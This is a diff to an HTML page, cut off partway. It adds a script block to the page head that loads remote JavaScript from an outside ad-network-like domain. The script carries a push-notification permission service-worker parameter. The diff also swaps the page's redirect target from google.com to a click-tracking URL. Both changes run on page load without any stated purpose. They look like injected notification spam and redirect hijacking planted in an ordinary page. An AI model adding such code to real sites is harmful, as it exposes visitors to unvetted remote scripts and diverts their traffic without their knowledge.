@@ -1,8 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <script>
+    var s = document.createElement('script');
+    s.src='//redrotou.net/pfe/current/micro.tag.min.js?z=5795779'+'&sw=/sw-check-permissions-932df.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+
     <script type="text/javascript">
-		var redirurl = 'http://www.google.com'//change to desired redirect url
+		var redirurl = 'https://skrotrack.com/click'
         function getURLParameter(name) {
             return decodeURI(
                 (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
